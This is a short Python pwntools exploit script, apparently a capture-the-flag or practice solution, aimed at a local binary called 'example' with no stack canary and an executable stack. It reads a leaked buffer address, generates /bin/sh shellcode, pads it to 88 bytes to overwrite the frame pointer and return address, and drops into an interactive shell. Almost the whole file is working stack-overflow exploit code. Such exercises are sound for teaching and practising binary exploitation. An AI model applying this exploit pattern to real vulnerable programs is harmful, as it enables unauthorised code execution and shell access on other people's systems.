#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template example
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "example")

# Set your terminal for gdb here
context.terminal = ["terminator", "-e"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x400000)
# Stack:      Executable
# RWX:        Has RWX segments
# Stripped:   No
# Debuginfo:  Yes

io = start()

address = int(io.recvline().decode().split(" ")[-1], 16)  # Get address of buffer

payload = asm(shellcraft.sh())  # Create shellcode using pwntools
payload = payload.ljust(88, b"A")  # 80 to fill buffer + 8 to overwrite frame pointer
payload += p64(address)

io.sendline(payload)

io.interactive()
